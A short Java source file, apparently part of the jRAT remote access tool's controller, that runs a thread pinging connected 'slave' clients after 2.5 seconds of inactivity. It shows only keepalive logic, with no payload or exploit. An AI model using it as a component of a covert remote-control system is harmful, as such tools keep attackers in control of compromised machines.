package io.jrat.controller.threads;

import io.jrat.controller.AbstractSlave;
import io.jrat.controller.Main;

public class ThreadPing extends Thread {

	public ThreadPing() {
		super("Ping thread");
	}

	public void run() {
		while (true) {
			for (int i = 0; i < Main.connections.size(); i++) {
				try {
					AbstractSlave slave = Main.connections.get(i);

					long sinceLastRead = System.currentTimeMillis() - slave.getCountingInputStream().getLastRead();
					long sinceLastWrite = System.currentTimeMillis() - slave.getCountingOutputStream().getLastWrite();

					if (sinceLastRead > 2500L || sinceLastWrite > 2500L) {
						slave.beginPing();
					}

				} catch (NullPointerException ex) {

				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
			
			try {
				Thread.sleep(2500L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
